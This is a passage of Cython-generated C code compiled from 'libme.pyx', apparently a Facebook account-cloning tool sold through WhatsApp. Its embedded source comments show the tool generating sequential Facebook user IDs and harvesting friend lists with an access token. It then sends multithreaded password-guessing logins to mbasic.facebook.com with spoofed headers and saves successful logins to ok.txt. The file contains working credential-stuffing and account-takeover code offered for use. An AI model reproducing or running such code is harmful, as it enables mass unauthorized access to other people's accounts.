  {&__pyx_kp_s_upgrade_insecure_requests, __pyx_k_upgrade_insecure_requests, sizeof(__pyx_k_upgrade_insecure_requests), 0, 0, 1, 0},
  {&__pyx_n_s_upper, __pyx_k_upper, sizeof(__pyx_k_upper), 0, 0, 1, 1},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_s_urllib, __pyx_k_urllib, sizeof(__pyx_k_urllib), 0, 0, 1, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_kp_s_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 0, 1, 0},
  {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
  {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
  {&__pyx_n_s_value, __pyx_k_value, sizeof(__pyx_k_value), 0, 0, 1, 1},
  {&__pyx_n_s_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 0, 1, 1},
  {&__pyx_n_s_weekday, __pyx_k_weekday, sizeof(__pyx_k_weekday), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_kp_s_www_facebook_com, __pyx_k_www_facebook_com, sizeof(__pyx_k_www_facebook_com), 0, 0, 1, 0},
  {&__pyx_n_s_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 0, 1, 1},
  {&__pyx_kp_s_x_fb_connection_bandwidth, __pyx_k_x_fb_connection_bandwidth, sizeof(__pyx_k_x_fb_connection_bandwidth), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_connection_quality, __pyx_k_x_fb_connection_quality, sizeof(__pyx_k_x_fb_connection_quality), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_connection_type, __pyx_k_x_fb_connection_type, sizeof(__pyx_k_x_fb_connection_type), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_http_engine, __pyx_k_x_fb_http_engine, sizeof(__pyx_k_x_fb_http_engine), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_net_hni, __pyx_k_x_fb_net_hni, sizeof(__pyx_k_x_fb_net_hni), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_sim_hni, __pyx_k_x_fb_sim_hni, sizeof(__pyx_k_x_fb_sim_hni), 0, 0, 1, 0},
  {&__pyx_kp_s_xdg_open_https_youtube_com_chann, __pyx_k_xdg_open_https_youtube_com_chann, sizeof(__pyx_k_xdg_open_https_youtube_com_chann), 0, 0, 1, 0},
  {&__pyx_n_s_xo, __pyx_k_xo, sizeof(__pyx_k_xo), 0, 0, 1, 1},
  {&__pyx_n_s_xx, __pyx_k_xx, sizeof(__pyx_k_xx), 0, 0, 1, 1},
  {&__pyx_n_s_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 0, 1, 1},
  {&__pyx_n_s_year, __pyx_k_year, sizeof(__pyx_k_year), 0, 0, 1, 1},
  {&__pyx_kp_s_you_are_not_registered, __pyx_k_you_are_not_registered, sizeof(__pyx_k_you_are_not_registered), 0, 0, 1, 0},
  {&__pyx_n_s_zx, __pyx_k_zx, sizeof(__pyx_k_zx), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_ImportError = __Pyx_GetBuiltinName(__pyx_n_s_ImportError); if (!__pyx_builtin_ImportError) __PYX_ERR(0, 26, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 45, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 47, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 68, __pyx_L1_error)
  __pyx_builtin_IOError = __Pyx_GetBuiltinName(__pyx_n_s_IOError); if (!__pyx_builtin_IOError) __PYX_ERR(0, 69, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 80, __pyx_L1_error)
  __pyx_builtin_KeyError = __Pyx_GetBuiltinName(__pyx_n_s_KeyError); if (!__pyx_builtin_KeyError) __PYX_ERR(0, 96, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 155, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "libme.pyx":80
 * 		lulu = xx.text
 * 		print ("")
 * 		hulu = input("\033[0;92m[+] Enter Key : ")             # <<<<<<<<<<<<<<
 * 		if lulu == hulu:
 * 			print('\n\x1b[0;32m  [] Login Successfully\n')
 */
  __pyx_tuple__2 = PyTuple_Pack(1, __pyx_kp_s_0_92m_Enter_Key); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  /* "libme.pyx":92
 * 		os.system("clear")
 * 		try:
 * 			key = open(".__apikey__.log","r").read()             # <<<<<<<<<<<<<<
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 * 			status = a["member"]
 */
  __pyx_tuple__3 = PyTuple_Pack(2, __pyx_kp_s_apikey___log, __pyx_n_s_r); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  /* "libme.pyx":110
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 * 			choose = input("\n  [] Select One : ")             # <<<<<<<<<<<<<<
 * 			if choose in [""]:
 * 				print(" [!!] Sorry Your Choice Wrong")
 */
  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_s_Select_One); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  /* "libme.pyx":140
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")             # <<<<<<<<<<<<<<
 * 				input("  [] Return menu")
 * 				self.__start__()
 */
  __pyx_tuple__5 = PyTuple_Pack(1, __pyx_kp_s_1_37m_Warning_0_97mYou_Are_Not); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 140, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);

  /* "libme.pyx":141
 * 			if choose in [""]:
 * 				exit(" [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6")
 * 				input("  [] Return menu")             # <<<<<<<<<<<<<<
 * 				self.__start__()
 * 			if choose in ["6", "06"]:
 */
  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_kp_s_Return_menu); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 141, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  /* "libme.pyx":146
 * 				apikey = open(".__apikey__.log", "r").read()
 * 				os.system('am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")             # <<<<<<<<<<<<<<
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 */
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_s_1_31m_Warning_0_37m_Don_t_Run_T); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  /* "libme.pyx":148
 * 				exit("\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...")
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")             # <<<<<<<<<<<<<<
 * 	def __fb__(self):
 * 		x = 11111111
 */
  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_kp_s_1_31m_Warning_1_37m_You_Are_Not); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  /* "libme.pyx":153
 * 		xx = 99999999
 * 		idx = "1000000"
 * 		limit = int(input("  \033[0;92m[!] Enter The Number Of Ids : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_tuple__9 = PyTuple_Pack(1, __pyx_kp_s_0_92m_Enter_The_Number_Of_Ids); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  /* "libme.pyx":162
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_s_Enter_password); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 162, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  /* "libme.pyx":164
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;92m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;92m[] Ok result saved in > ok.txt")
 */
  __pyx_tuple__11 = PyTuple_Pack(1, __pyx_kp_s_Password_Minimum_6_Characters); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 164, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  /* "libme.pyx":160
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;0m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;92m[*] For example separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
  __pyx_tuple__13 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);

  /* "libme.pyx":171
 * 				for user in self.id:
 * 					coeg.submit(self.__api__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
  __pyx_tuple__14 = PyTuple_Pack(1, __pyx_kp_s_Cracking_finished); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 171, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  /* "libme.pyx":194
 * 		for pw in pwx:
 * 			pw= pw.lower()
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})             # <<<<<<<<<<<<<<
 * 			xo = rex.url
 * 			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
 */
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_s_https_mbasic_facebook_com_login); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  /* "libme.pyx":212
 * 		x = 1111
 * 		xx = 9999
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:
 */
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_s_0_92m_Choose_Code_200_201_202_2); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 212, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  /* "libme.pyx":213
 * 		xx = 9999
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_tuple__17 = PyTuple_Pack(1, __pyx_kp_s_Enter_the_number_of_IDs); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 213, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  /* "libme.pyx":224
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_s_Password_Minimum_6_Characters_2); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 224, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  /* "libme.pyx":237
 * 		x = 11111111
 * 		xx = 99999999
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 */
  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_kp_s_0_91m_Choose_Code_11_12_13_14_1); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 237, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  /* "libme.pyx":238
 * 		xx = 99999999
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_tuple__20 = PyTuple_Pack(1, __pyx_kp_s_Enter_The_Number_Of_Ids); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 238, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  /* "libme.pyx":256
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n () cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
  __pyx_tuple__21 = PyTuple_Pack(1, __pyx_kp_s_cracking_finished); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  /* "libme.pyx":262
 * 		x = 1111111
 * 		xx = 9999999
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 */
  __pyx_tuple__22 = PyTuple_Pack(1, __pyx_kp_s_2010_10000170_10000180_10000190); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  /* "libme.pyx":304
 * 			ses = requests.Session()
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),             # <<<<<<<<<<<<<<
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 */
  __pyx_tuple__23 = PyTuple_Pack(2, __pyx_float_20000000_0, __pyx_float_30000000_0); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  /* "libme.pyx":305
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-connection-quality": "EXCELLENT",
 */
  __pyx_tuple__24 = PyTuple_Pack(2, __pyx_int_20000, __pyx_int_40000); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  /* "libme.pyx":331
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')             # <<<<<<<<<<<<<<
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 */
  __pyx_tuple__25 = PyTuple_Pack(1, __pyx_kp_s_0_97m_Your_Token); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__25);
  __Pyx_GIVEREF(__pyx_tuple__25);

  /* "libme.pyx":334
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)             # <<<<<<<<<<<<<<
 * 			print (" \n  [] successful login token")
 * 			self.__bot__follow__()
 */
  __pyx_tuple__26 = PyTuple_Pack(2, __pyx_kp_s_login_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  /* "libme.pyx":342
 * 	def __bot__follow__(self):
 * 		try:
 * 			token=open("login.txt","r").read()             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 */
  __pyx_tuple__27 = PyTuple_Pack(2, __pyx_kp_s_login_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 342, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);

  /* "libme.pyx":370
 * 		except IOError:
 * 			os.system("rm -f login.txt")
 * 			exit(" [!] Expired tokens")             # <<<<<<<<<<<<<<
 * 		except requests.exceptions.ConnectionError:
 * 			exit(" [!] No internet connection")
 */
  __pyx_tuple__29 = PyTuple_Pack(1, __pyx_kp_s_Expired_tokens); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 370, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);

  /* "libme.pyx":372
 * 			exit(" [!] Expired tokens")
 * 		except requests.exceptions.ConnectionError:
 * 			exit(" [!] No internet connection")             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")
 * 		print("  [2] Try method No - 2 (fast)")
 */
  __pyx_tuple__30 = PyTuple_Pack(1, __pyx_kp_s_No_internet_connection); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);

  /* "libme.pyx":377
 * 		print("  [3] Try method No - 3 (fast)")
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 * 		james = input("\n  [] Choose Option :  ")             # <<<<<<<<<<<<<<
 * 		if james =="":
 * 			self.__menu__file__()
 */
  __pyx_tuple__31 = PyTuple_Pack(1, __pyx_kp_s_Choose_Option); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);

  /* "libme.pyx":388
 * 		elif james == "0" or james == "00":
 * 			os.system("rm -f login.txt")
 * 			exit("\n [] Successfully deleted token")             # <<<<<<<<<<<<<<
 * 		else:
 * 			self.__login__()
 */
  __pyx_tuple__32 = PyTuple_Pack(1, __pyx_kp_s_Successfully_deleted_token); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 388, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);

  /* "libme.pyx":396
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")
 * 		__method__2__ = input("\n  [] Choose Option : ")             # <<<<<<<<<<<<<<
 * 		if __method__2__ == "":
 * 			self.menu_file()
 */
  __pyx_tuple__33 = PyTuple_Pack(1, __pyx_kp_s_Choose_Option_2); if (unlikely(!__pyx_tuple__33)) __PYX_ERR(0, 396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__33);
  __Pyx_GIVEREF(__pyx_tuple__33);

  /* "libme.pyx":411
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 */
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_s_Token_invalid); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 411, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  /* "libme.pyx":413
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
  __pyx_tuple__35 = PyTuple_Pack(1, __pyx_kp_s_How_Much_Link_You_Want_Dump); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 413, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);

  /* "libme.pyx":420
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_kp_s_Enter_User_ID); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 420, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  /* "libme.pyx":427
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
  __pyx_slice__37 = PySlice_New(Py_None, __pyx_int_6, Py_None); if (unlikely(!__pyx_slice__37)) __PYX_ERR(0, 427, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__37);
  __Pyx_GIVEREF(__pyx_slice__37);

  /* "libme.pyx":431
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [] Warning! Check link")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 */
  __pyx_tuple__40 = PyTuple_Pack(1, __pyx_kp_s_Warning_Check_link); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);

  /* "libme.pyx":444
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_s_Password_method_y_t); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 444, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  /* "libme.pyx":450
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_tuple__42 = PyTuple_Pack(1, __pyx_kp_s_password_minimum_6_characters); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 450, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  /* "libme.pyx":479
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [?] How much account u want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
  __pyx_tuple__44 = PyTuple_Pack(1, __pyx_kp_s_How_much_account_u_want_dump); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 479, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  /* "libme.pyx":496
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except KeyError:
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(____, 'r').readlines()
 */
  __pyx_tuple__45 = PyTuple_Pack(1, __pyx_kp_s_Dump_failed_maybe_the_user_is_w); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 496, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  /* "libme.pyx":539
 * 	def __menn__(self):
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')             # <<<<<<<<<<<<<<
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
  __pyx_tuple__46 = PyTuple_Pack(1, __pyx_kp_s_0_97m_Enter_your_file); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 539, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  /* "libme.pyx":639
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How much link you want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
  __pyx_tuple__47 = PyTuple_Pack(1, __pyx_kp_s_How_much_link_you_want_dump); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 639, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  /* "libme.pyx":657
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(__file, 'r').readlines()
 */
  __pyx_tuple__48 = PyTuple_Pack(1, __pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 657, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__48);
